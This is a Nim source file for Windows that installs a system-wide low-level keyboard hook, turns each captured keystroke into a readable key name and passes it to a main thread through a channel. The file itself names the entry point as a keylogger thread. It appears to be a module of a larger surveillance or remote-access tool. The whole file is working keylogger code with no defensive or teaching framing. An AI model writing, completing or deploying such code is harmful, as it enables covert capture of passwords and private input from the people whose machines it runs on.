from tables import `[]`

import winim
import ../channels
from ../constants import keys
var eHook: HHOOK

# var keylog: string = ""

proc keyboardHandler(nCode: int32, wparam: WPARAM, lparam: LPARAM): LRESULT {.stdcall.} =
  if (nCode == HC_ACTION):

    let kbs: PKBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lparam)
    let key: DWORD = kbs.vkCode
    let keyText: string = keys[kbs.vkCode]

    if wparam == WM_KEYDOWN or wparam == WM_SYSKEYDOWN:
      mainThread.send keyText
      # keylog.add "sal cf" # Keys::KEYS[kbs->vkCode].Name;

      if (kbs.vkCode == VK_RETURN):
        # keylog.add '\n'
        discard
    elif wparam == WM_KEYUP or wparam == WM_SYSKEYUP: # if key state is
    # released, used for
    # sys keys like SHIFT
      if key == VK_CONTROL or key == VK_LCONTROL or key == VK_RCONTROL or
          key == VK_SHIFT or key == VK_RSHIFT or key == VK_LSHIFT or
          key == VK_MENU or key == VK_LMENU or key == VK_RMENU or
          key == VK_CAPITAL or key == VK_NUMLOCK or key == VK_LWIN or
          key == VK_RWIN:
        var KeyName: string = keyText # Keys::KEYS[kbs->vkCode].Name # translate key to human friendly name
        KeyName.insert("/", 1) # insert like [SHIFT] [a] [b] [/SHIFT]
        mainThread.send KeyName

  result = CallNextHookEx(eHook, nCode, wparam, lparam)

proc install(): void =
  let handle: HMODULE = GetModuleHandle(NULL)

  eHook = SetWindowsHookEx(WH_KEYBOARD_LL, HOOKPROC keyboardHandler, handle, 0)

  PostMessage(0, 0, 0, 0)

proc initKeyloggerThread*(): void {.thread.} =
  install()

  var msg: MSG

  while GetMessage(addr msg, 0, 0, 0):
    TranslateMessage(addr msg)
    DispatchMessage(addr msg)
